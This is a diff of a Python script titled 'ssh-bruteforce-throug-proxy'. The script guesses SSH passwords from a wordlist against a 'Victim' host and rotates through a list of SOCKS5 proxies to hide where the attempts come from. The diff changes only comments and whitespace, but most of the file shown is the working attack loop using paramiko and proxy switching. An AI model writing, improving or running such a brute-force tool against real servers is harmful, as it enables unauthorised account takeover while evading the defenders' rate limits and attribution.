@@ -2,14 +2,14 @@ ssh-bruteforce-throug-proxy
 
 #!/usr/bin/env python
 
-## Usage: ./joder.py <Victim host> 22 root pass.txt proxies.txt
+## Usage: ./joder.py <Victim ip> 22 queloco pass.txt proxies.txt
 
 import sys, paramiko, warnings, os
 import socket, socks, urllib2
 
 def request(proxy, p_proxy, password):
 
-########################## Set the proxy
+########################## Use the proxy
         socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy, p_proxy)
         socket.socket = socks.socksocket
 ###########################
@@ -20,7 +20,7 @@ def request(proxy, p_proxy, password):
         port = sys.argv[2]
         username = sys.argv[3]
 
-       try:
+        try:
             client = paramiko.SSHClient()
             client.load_system_host_keys()
             client.set_missing_host_key_policy(paramiko.WarningPolicy)
@@ -33,6 +33,7 @@ def request(proxy, p_proxy, password):
            else:
                 print "ERROR"
                 no_done.write(password + "\n")
+
 
 no_done = open("no_done.txt", "w+")
 
@@ -57,5 +58,6 @@ for pos in range(0,int(leng_pass)):
     port_proxy = int(proxy.split()[1])
     proxy_pos = proxy_pos + 1
     password = (lines_pass[pos]).rstrip()
+
 
     request(ip_proxy, port_proxy, password)
